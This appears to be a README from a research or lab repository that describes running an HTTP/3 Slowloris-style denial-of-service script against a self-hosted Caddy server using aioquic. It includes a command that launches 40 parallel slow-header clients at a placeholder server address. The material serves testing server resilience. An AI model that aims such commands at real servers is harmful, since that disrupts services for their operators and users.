# HTTP3-Loris Attack

This script performs an HTTP/3 Loris-style attack by sending requests with slow headers using the `aioquic` library.

---

## 🔧 Prerequisites

- Ensure the **Caddy server** is running with HTTP/3 support.
  See the root [`CaddySetup.md`](../docs/CaddySetup.md) for setup instructions.

- Verify that `MAX_TABLE_CAPACITY` in `aioquic/src/aioquic/h3/connection.py` (line 370) is set to the default value `4096`.

- Edit the attack script `http3-loris.sh` and replace the placeholder with  your server's address: 
```bash
sudo seq 1 40 | timeout 5s xargs -n1 -P40 python3 examples/http3_client.py https://<your-server-ip> -d $x
```

## ✅ Optional:
Modify and run the included timer_script.sh in another terminal to monitor server response behavior during the attack.

## 🚀 How to Run

```bash
cd ../../aioquic
./http3-loris/http3-loris.sh
```

